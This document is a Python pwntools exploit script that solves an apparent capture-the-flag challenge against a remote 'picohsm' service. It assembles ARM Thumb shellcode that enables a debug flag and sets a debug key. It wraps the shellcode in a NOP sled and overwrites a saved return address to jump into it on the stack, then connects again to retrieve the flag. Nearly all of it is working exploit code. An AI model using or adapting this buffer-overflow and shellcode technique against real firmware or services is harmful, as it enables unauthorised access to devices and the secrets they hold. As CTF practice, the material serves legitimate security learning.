#!/usr/bin/python
from pwn import *

context(arch='thumb', log_level='DEBUG')

debug_enabled = 0x20000008
debug_key = 0x2000000C
served = 0x08000724
stack = 0x20002000

flag = 0x4242

shellcode = asm('\n'.join([
  'mov r1, 0x%x' % flag,
  'movt r1, 0',
  'ldr r0, =0x%x' % debug_enabled,
  'str r1, [r0]',
  'ldr r0, =0x%x' % debug_key,
  'str r1, [r0]',
  'ldr r0, =0x%x + 1' % served,
  'bx r0',
]))
assert len(shellcode) % 2 == 0
cmd = b'help\n '
assert len(cmd) % 2 == 0
nop = asm('nop')
assert len(nop) == 2
prefix = cmd + nop * int((0x300 - len(cmd) - len(shellcode)) / 2) + shellcode
assert len(prefix) == 0x300
payload = prefix + p32(0) + p32(stack - 0x300 + 1)
assert len(payload) <= 0x400

p = remote('picohsm.donjon-ctf.io', 8008)
p.recvuntil('Timeout in 15 seconds...')
p.send(payload)
p.recvuntil('decrypt [PIN] [KEYID] [HEX] - decrypt a data blob.\n')
p.close()

sleep(1)

p = remote('picohsm.donjon-ctf.io', 8008)
p.recvuntil('Timeout in 15 seconds...')
p.send('getflag %i\n' % flag)
print(p.recvuntil('\n'))
print(p.recvuntil('\n'))
p.close()

# CTF{Ju5t_A_W4rmUP}
